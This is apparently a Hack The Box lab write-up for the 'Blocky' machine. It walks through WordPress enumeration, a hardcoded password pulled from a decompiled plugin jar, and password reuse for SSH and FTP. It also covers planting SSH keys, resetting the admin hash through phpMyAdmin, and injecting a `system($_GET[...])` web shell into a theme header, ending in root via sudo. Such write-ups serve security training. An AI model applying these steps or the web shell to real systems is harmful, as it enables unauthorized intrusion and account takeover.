with the command `nmap -sC -sV -A -oN nmap.scans -vv 10.10.10.37`

```nmap

80/tcp   open   http    syn-ack ttl 63 Apache httpd 2.4.18
```
3 ports are open , Port 80 running the webserver, port 21 running ftp and port 22 ssh

## Port 80 http

The webpage had a default webpage hosted by wordpress server

Pocking around I found where once can commend wich seamed like a XXS exploit but it was a rabbit hole 

![Alt text](/assets/img/htb/Blocky/bl2.png)

Scanning the wordpress, I dound a baunch of plugins and one user 

```wpscan
[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)

 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Notch

```

## Gobuster scan 

After I was out of options I decided to scan for gobuster and found intresting hidden directories

![Alt text](/assets/img/htb/Blocky/bl3.png)

# Foothold

With the plugin folder, there were 2 jar files, Downloaded the files and unzip them both

![Alt text](/assets/img/htb/Blocky/bl4.png)

Blockcore zip file had these files in which the java file seemed intresting one 

```bash
┌──(root㉿kali)-[/home/…/CTFs/HackTheBox/Blocky/BlockyCore]
└─# tree
.
├── BlockyCore.jar
├── com
│   └── myfirstplugin
│       └── BlockyCore.class
└── META-INF
    └── MANIFEST.MF

4 directories, 3 files
```

Reading the content of the javafile there seemed to be some credential information there 

```java
  public java.lang.String sqlUser;

  public java.lang.String sqlPass;

  public com.myfirstplugin.BlockyCore();
    Code:
       0: aload_0
       1: invokespecial #12                 // Method java/lang/Object."<init>":()V
       4: aload_0
       5: ldc           #14                 // String localhost
       7: putfield      #16                 // Field sqlHost:Ljava/lang/String;
      10: aload_0
      11: ldc           #18                 // String root
      13: putfield      #20                 // Field sqlUser:Ljava/lang/String;
      16: aload_0
      17: ldc           #22                 // String 8YsqfCTnvxAUeduzjNSXe22
      19: putfield      #24                 // Field sqlPass:Ljava/lang/String;
      22: return
```
I attempted to log in to WordPress online, but the attempt failed. However, I succeeded in accessing it via FTP and SSH using the user notch, owing to the reuse of passwords.

![Alt text](/assets/img/htb/Blocky/bl5.png)


# Privilege Escalation
When I ran the command sudo -l on the machine, I discovered that I could execute all commands with sudo privileges without needing to enter a password. However, to reveal this exploit, I still had to provide the password for the user `notch`.

> # Exploitation method 2(The hadder way)

## Exploting FTP

Since we had a username of `notch` and a password of `8YsqfCTnvxAUeduzjNSXe22` that could FTP the machine, we had access to the notch home folder

![Alt text](/assets/img/htb/Blocky/bl7.png)
 Because we were at `notch` home file and there was not ssh_keys there, I created one and dropped it to the home folder creaking a .ssh folder in there and we login using ssh_keys private key but you have to rename the pub key to authorized_keys for it to work

![Alt text](/assets/img/htb/Blocky/bl8.png)


## Privilege Escalation

Since phpMyAdmin appeared in the directory listing, I decided to check its configuration file for any exposed passwords. Upon finding the file, I noticed it was owned by www-data. To gain access as www-data, I had to uploaded a shell into the WordPress directory. However, to proceed, I needed to obtain WordPress login credentials.
![Alt text](/assets/img/htb/Blocky/bl11.png)

When I ran the command netstat to check for running processes, I noticed that MySQL was running locally. Therefore, our next step is to locate the credentials associated with MySQL.

![Alt text](/assets/img/htb/Blocky/bl9.png)

 In `/var/www/html` there is a `wp-config.php` configuration file which always contains some passwords

 ```mysql
 // ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

 ```

Now, with the above credentials, we have the option to log in to MySQL directly, but I prefer using phpMyAdmin due to its user-friendliness. Although we have a password hash, cracking it would be time-consuming.

![Alt text](/assets/img/htb/Blocky/bl10.png)

So to change the password I need to generate a new password with the same algorithm, phpmyadmin.I used this [PoC](https://www.cloudways.com/blog/php-password-encryption/) to generate a new password

```nmap
┌──(root㉿kali)-[/home/…/Documents/CTFs/HackTheBox/Blocky]
└─# php -a             
Interactive shell

php > echo password_hash("siresire", PASSWORD_DEFAULT); 
$2y$10$BNwKh7e8j9iZkkTBNxuhX.r/LG8Ka6DJLNgNqOFLPVjSvRHtN6JPO
php > 

```

And I successfully logged in with the new password.

In the Appearance editor, I modified the Header file by inserting a simple PHP system command.

`system($_GET['lfi']);`

![Alt text](/assets/img/htb/Blocky/bl13.png)

After intercepting the request with Burp, I gained command execution capabilities.

![Alt text](/assets/img/htb/Blocky/bl14.png)

Since I already had a shell with SSH access and the necessary SSH keys, my sole objective was to read the contents of `/etc/phpmyadmin/config-db.php` to check for any stored passwords.


![Alt text](/assets/img/htb/Blocky/bl15.png)

As there was a password present, and knowing the tendency for password reuse on this system, I attempted to utilize it with the user notch. After trying sudo -l with the password, it successfully granted me access. In the end, this allowed me to root the machine.
